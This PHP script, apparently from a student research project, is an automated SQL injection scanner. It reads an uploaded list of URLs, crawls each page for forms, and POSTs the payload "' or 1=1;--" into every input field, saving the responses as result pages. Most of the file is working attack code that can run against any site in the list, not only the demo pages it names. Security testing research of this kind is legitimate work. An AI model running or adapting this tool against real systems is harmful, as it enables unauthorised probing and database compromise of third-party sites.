<?php
    /*----------------------- Recebe e trata o arquivo -----------------------*/

    $target_dir = "uploads/"; //diretório onde o arquivo será salvo
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); //nome do arquivo
    $uploadOk = 1;
    $fileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION)); //extensão do arquivo
    // verifica se o arquivo ká existe
    if(file_exists($target_file)) {
        echo "O arquivo já existe";
        $uploadOk = 0;
    }
    //se o arquivo for maior que 500KB, retorna erro
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        echo "O arquivo é muito grande.";
        $uploadOk = 0;
    }
    if($fileType != "txt") {
        echo "Apenas o formato \".txt\" é aceito";
        $uploadOk = 0;
    }
    //se não houve nenhum erro, grava o arquivo na pasta
    if ($uploadOk == 0) {
        echo "Desculpe, seu arquivo não foi enviado.";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "O arquivo ". basename( $_FILES["fileToUpload"]["name"]) . " foi enviado.";
        } else {
            echo "<br/> Desculpe, houve um erro enviando o seu arquivo.";
        }
    }

    $myFile = fopen($target_file, "r") or die("Não foi possível abrir o arquivo.");
    echo "<br/>";

    $urls = array();

    while (!feof($myFile)) {
        $url = fgets($myFile);

        $urls[] = $url;
    }

    /*----------------------- Faz os requests com as urls recebidas -----------------------*/

    /*
    https://symfony.com/doc/current/components/dom_crawler.html
    */
    require 'vendor/autoload.php';

    use Goutte\Client;
    $aData = array();
    $urls = array('http://143.106.241.3/~cl18119/pibic/demo/demo2.php',
    'http://143.106.241.3/~cl18119/pibic/demo/demo1.php');
    $linkResults = array();

    function limpaResultados()
    {
        $directory = "./results/";
        // Open a directory, and read its contents
        if (is_dir($directory))
        {
            if ($opendirectory = opendir($directory))
            {
                while (($file = readdir($opendirectory)) !== false)
                {
                    unlink($directory.$file);
                }
                closedir($opendirectory);
            }
        }
    }

    function loadUrls($arq)
    {
        $matriz = array();
        $file_lines = file($arq);
        foreach ($file_lines as $line) {
            $matriz[] = trim($line);
        }
        return $matriz;
    }

    function passo1($url)
    {
        $aResultado = array();
        $client = new Client();
        $crawler = $client->request('GET', $url);
        $crawler->filter('form')->each(function ($node) use ($url,&$aResultado) {
            $metodo = $node->attr('method');
            $action = $node->attr('action');
            $node->filter('input')->each(function($no) use ($url, &$aResultado) {
                $aResultado[$no->attr('type')] = $no->attr('name');
            });
            $aResultado["metodo"] = $metodo<>''?$metodo:"";
            $aResultado["action"] = $action<>''?$action:"";
        });
        return $aResultado;
    }

    function passo2($aDados)
    {
    $client = new GuzzleHttp\Client();
    $promises = array();
    $dir = './results/';
    foreach ($aDados as $key => $value) {
        $metodo = $value['metodo'];
        $action = $value['action'];
        $uri = $key.'/'.$action;
        //conterá os parametros a serem enviados na
        //tentativa de ataque
        $form_fields = array();
        foreach($value as $nome=>$valor)
        {
            $form_fields['form_params'][$valor] = '\' or 1=1;--';
        }
        //Envia a requisição de ataque
        $promises[$key] = $client->postAsync($uri,$form_fields);
    }
    $n=1;
    //promises que receberão as respostas e gravarão
    //em arquivos
    foreach($promises as $key => $value)
    {
        $value->then(function ($response) use ($key,$dir,$n) {
            if($response->getStatusCode() == 200) //ok
            {
                $resposta = '<!--'.$key."-->\n".$response->getBody();

                while(file_exists($dir.$n.'.html')) {
                    $n++;
                }
                global $linkResults;
                array_push($linkResults, 'results/'.$n.'.html');
                file_put_contents($dir.$n.'.html',$resposta);
            }
        });
        $n++;
    }
    $results = GuzzleHttp\Promise\unwrap($promises);
    // Aguarda as requests completarem, mesmo se houver alguma falha
    $results = GuzzleHttp\Promise\settle($promises)->wait();

    }

    //Bloco principal

    if (ob_get_level() == 0) ob_start();

    $aUrl = array();
    print('<h1>Carregando URLs...</h1>');
    ob_flush();
    flush();
    $aUrl = loadUrls($target_file);

    $aStep2 = array();
    print('<h1>Processando: Passo 1...</h1>');
    ob_flush();
    flush();
    foreach($aUrl as $url)
    {
       $aStep2[$url] = passo1($url);
    }

    print('<h1>Processando: Passo 2...</h1>');
    ob_flush();
    flush();
    passo2($aStep2);

    print('<h1>Processamento concluído!</h1>');

    echo "<br><h1>Os resultados gerados nessa sessão foram:</h1><br>";

    $n = 1;
    foreach($linkResults as $link) {
        if(isset($link)) {
            echo '<a href="' . $link . '">Resultado ' . $n . '</a><br>';
            $n++;
        }
    }
